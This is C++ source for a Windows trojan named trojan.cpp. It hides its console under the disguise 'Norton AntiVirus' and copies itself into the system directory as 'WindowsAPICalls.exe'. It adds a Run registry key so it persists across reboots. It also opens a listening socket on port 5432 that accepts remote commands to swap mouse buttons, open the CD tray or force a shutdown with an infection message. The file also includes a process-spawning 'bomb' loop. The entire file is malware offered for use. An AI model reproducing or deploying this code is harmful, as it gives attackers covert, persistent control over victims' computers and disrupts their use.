// trojan.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment (lib, "Ws2_32.lib") // Need to link with Ws2_32.lib
#pragma comment (lib, "winmm.lib") // Need to link with winmm.lib


#pragma runtime_checks( "[runtime_checks]", off )

using namespace std;
char Windir[MAX_PATH];
char Module[MAX_PATH];
SOCKET Socket;

void Hide()
{
	SetConsoleTitle("Norton AntiVirus");
	HWND hide = FindWindow(NULL, "Norton AntiVirus");
	ShowWindow(hide, 0);
}

void GetPaths()
{
	GetSystemDirectory(Windir, sizeof(Windir));
	GetModuleFileName(0, Module, sizeof(Module));
	strcat(Windir, "\\WindowsAPICalls.exe");
}

void Install()
{
	CopyFile(Module,Windir,0);
	HKEY Install;

	RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &Install);
	RegSetValueEx(Install, "Windows API Calls", 0, REG_SZ, (LPBYTE)Windir, sizeof(Windir));
	RegCloseKey(Install);
}

int ServerInitialize()
{
	WSADATA wsaData;
	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );

	if ( iResult != NO_ERROR )
	{
		WSACleanup();
		system(Module);
		return 0;
	}
	else
	{
		cout << "Winsock initialized." << "\n";
	}

	Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if (Socket == INVALID_SOCKET )
	{
		WSACleanup();
		system(Module);
		return 0;
	}
	else
	{
		cout << "Socket created." << "\n";
	}

	sockaddr_in service;
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = INADDR_ANY;
	service.sin_port = htons(5432);

	if (bind(Socket, (SOCKADDR*) &service,sizeof(service)) == SOCKET_ERROR)
	{
		closesocket(Socket);
		system(Module);
		return 0;
	} 
	else
	{
		cout << "Socket bound successfully." << "\n";
	}

	if (listen( Socket, 1 ) == SOCKET_ERROR )
		;
	
	cout << "Error listening on socket." << "\n";
	
	SOCKET AcceptSocket;
	cout << "Waiting for a client to connect…" << "\n";
	
	AcceptSocket = SOCKET_ERROR;
	while (AcceptSocket == SOCKET_ERROR )
	{
		AcceptSocket = accept(Socket, NULL, NULL );
	}

	cout << "Client Connected."<< "\n";
	Socket = AcceptSocket;
}

void Shutdown()
{
	char Message[MAX_PATH]="Your computer is infected with a malicious virus!";
	InitiateSystemShutdown(NULL,Message,sizeof(Message),true,false);
}
void OpenCloseCDTray()
{
	mciSendString("set cdaudio door open", 0, 0, 0);
	mciSendString("set cdaudio door open", 0, 0, 0);
}
void Bomb()
{
	HWND hwnd;
	char Notepad[MAX_PATH]="notepad.exe";
	
	for(;;)
	{
		ShellExecute(hwnd,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
	}
}
void LeftMouse()
{
	SwapMouseButton(true);
}

void RightMouse()
{
	SwapMouseButton(false);
}

void Receive()
{
	for(;;)
	{
		char Choice[MAX_PATH]="";
		cout << "Waiting for commands, sir!" << "\n";
		
		recv(Socket, Choice, sizeof(Choice), 0);
		cout << Choice << "\n";
		
		if (!strcmp(Choice,"1"))
		{
			LeftMouse();
			const char c_LeftMouse[MAX_PATH]={"Mouse changed; left."};
			send(Socket,c_LeftMouse, sizeof(c_LeftMouse),0);
		}
		
		if (!strcmp(Choice,"2"))
		{
			RightMouse();
			const char c_RightMouse[MAX_PATH]={"Mouse changed; right."};
			send(Socket,c_RightMouse, sizeof(c_RightMouse),0);
		}

		if (!strcmp(Choice,"3"))
		{
			OpenCloseCDTray();
			const char c_CDTray[MAX_PATH]={"CD Tray opened.  Closed if not on a laptop."};
			send(Socket,c_CDTray, sizeof(c_CDTray),0);
		}
		if (!strcmp(Choice,"4"))
		{
			Shutdown();
			const char c_Shutdown[MAX_PATH]={"Shutdown initiated."};
			send(Socket,c_Shutdown, sizeof(c_Shutdown),0);
		}
	}
}

int main()
{
	Hide();
	GetPaths();

	if(!strcmp(Windir,Module))
	{
		ServerInitialize();
		Receive();
	}
	else
	{
		Install();
		ServerInitialize();
		Receive();
	}

	return 0;
}